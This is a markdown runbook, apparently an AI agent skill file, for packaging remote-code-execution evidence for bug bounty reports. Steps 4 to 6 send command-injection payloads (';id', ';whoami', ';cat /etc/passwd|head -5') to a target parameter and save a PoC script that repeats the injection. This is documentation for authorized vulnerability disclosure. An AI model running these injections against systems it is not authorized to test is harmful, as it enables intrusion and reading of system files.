# RCE Evidence Collection Runbook

## Purpose
Package all evidence in a standardized format suitable for bug bounty report submission.

## Variables
- `$TARGET_URL` — confirmed vulnerable endpoint
- `$VULN_PARAM` — confirmed injectable parameter
- `$OUTDIR` — output directory
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/rce`
- `$RCE_TYPE` — one of: cmd-injection, ssti, lfi-rce, deserialization

## Step 1 — Initialize Evidence Directory
```bash
EVIDENCE_DIR="$OUTDIR/evidence/rce"
mkdir -p "$EVIDENCE_DIR/request" "$EVIDENCE_DIR/response" "$EVIDENCE_DIR/screenshots" "$EVIDENCE_DIR/tool-versions"
```

## Step 2 — Capture Tool Versions
```bash
curl --version > "$EVIDENCE_DIR/tool-versions/curl.txt" 2>&1
python3 --version > "$EVIDENCE_DIR/tool-versions/python3.txt" 2>&1
nuclei --version > "$EVIDENCE_DIR/tool-versions/nuclei.txt" 2>&1
which curl ffuf nuclei python3 > "$EVIDENCE_DIR/tool-versions/paths.txt" 2>&1
```

## Step 3 — Capture Clean Request / Response (baseline)
```bash
TIMESTAMP=$(date -u +%Y-%m-%dT%H:%M:%SZ)
curl -sk -v "$TARGET_URL?$VULN_PARAM=baseline" > "$EVIDENCE_DIR/request/baseline.txt" 2>&1
echo "Baseline captured at $TIMESTAMP" > "$EVIDENCE_DIR/request/baseline-timestamp.txt"
```

## Step 4 — Capture Exploit Request / Response
```bash
DATE=$(date -u +%Y-%m-%dT%H:%M:%SZ)

curl -sk -v "$TARGET_URL?$VULN_PARAM=;id" > "$EVIDENCE_DIR/request/01-exec-id.txt" 2>&1
curl -sk "$TARGET_URL?$VULN_PARAM=;id" -o "$EVIDENCE_DIR/response/01-exec-id-body.txt"
echo "$DATE" > "$EVIDENCE_DIR/timestamp.txt"

curl -sk -v "$TARGET_URL?$VULN_PARAM=;whoami" > "$EVIDENCE_DIR/request/02-exec-whoami.txt" 2>&1
curl -sk "$TARGET_URL?$VULN_PARAM=;whoami" -o "$EVIDENCE_DIR/response/02-exec-whoami-body.txt"

curl -sk -v "$TARGET_URL?$VULN_PARAM=;cat /etc/passwd|head -5" > "$EVIDENCE_DIR/request/03-exec-passwd.txt" 2>&1
curl -sk "$TARGET_URL?$VULN_PARAM=;cat /etc/passwd|head -5" -o "$EVIDENCE_DIR/response/03-exec-passwd-body.txt"
echo "$DATE" >> "$EVIDENCE_DIR/timestamp.txt"
```

## Step 5 — Capture Screenshot via curl HTML dump
```bash
curl -sk "$TARGET_URL?$VULN_PARAM=;id" -H "Accept: text/html" > "$EVIDENCE_DIR/screenshots/exec-id.html"
```

## Step 6 — Create PoC Script
```bash
cat > "$EVIDENCE_DIR/poc.sh" << 'POCEOF'
#!/bin/bash
TARGET_URL="${1:-$TARGET_URL}"
VULN_PARAM="${2:-$VULN_PARAM}"
curl -sk -v "$TARGET_URL?$VULN_PARAM=;id"
POCEOF
chmod +x "$EVIDENCE_DIR/poc.sh"
```

## Step 7 — Evidence Manifest
```bash
cat > "$EVIDENCE_DIR/manifest.md" << MANIFESTEOF
# RCE Evidence Manifest
**Target:** $TARGET_URL
**Vulnerable Parameter:** $VULN_PARAM
**RCE Type:** $RCE_TYPE
**Timestamp:** $(date -u +%Y-%m-%dT%H:%M:%SZ)

## Files
| File | Description |
|---|---|
| request/01-exec-id.txt | curl -v output of id command execution |
| response/01-exec-id-body.txt | Response body of id execution |
| request/02-exec-whoami.txt | curl -v output of whoami execution |
| request/03-exec-passwd.txt | curl -v output of /etc/passwd read |
| screenshots/exec-id.html | HTML screenshot of exploit |
| tool-versions/* | Tool versions used |
| poc.sh | Reproducible PoC script |
| timestamp.txt | Verification timestamp |
MANIFESTEOF
echo "Manifest written to $EVIDENCE_DIR/manifest.md"
```

## Step 8 — Validate Evidence Completeness
```bash
REQUIRED_FILES=(
  "request/01-exec-id.txt"
  "response/01-exec-id-body.txt"
  "poc.sh"
  "manifest.md"
  "timestamp.txt"
)
ALL_OK=true
for f in "${REQUIRED_FILES[@]}"; do
  if [ -s "$EVIDENCE_DIR/$f" ]; then
    echo "OK: $f"
  else
    echo "MISSING: $f"
    ALL_OK=false
  fi
done
$ALL_OK && echo "EVIDENCE PACKAGE COMPLETE" || echo "EVIDENCE PACKAGE INCOMPLETE"
```

## Step 9 — Verify No Secrets Leaked
```bash
gitleaks detect --source "$EVIDENCE_DIR" --no-git -v 2>&1 | tee "$EVIDENCE_DIR/leak-check.txt"
```

## Output Directory Structure
```
$OUTDIR/evidence/rce/
├── manifest.md
├── timestamp.txt
├── poc.sh
├── request/
│   ├── baseline.txt
│   ├── 01-exec-id.txt
│   ├── 02-exec-whoami.txt
│   └── 03-exec-passwd.txt
├── response/
│   ├── 01-exec-id-body.txt
│   ├── 02-exec-whoami-body.txt
│   └── 03-exec-passwd-body.txt
├── screenshots/
│   └── exec-id.html
└── tool-versions/
    ├── curl.txt
    ├── python3.txt
    ├── nuclei.txt
    └── paths.txt
```

## Next Routing
- Evidence complete with no secrets -> `.claude/skills/reporting/SKILL.md`
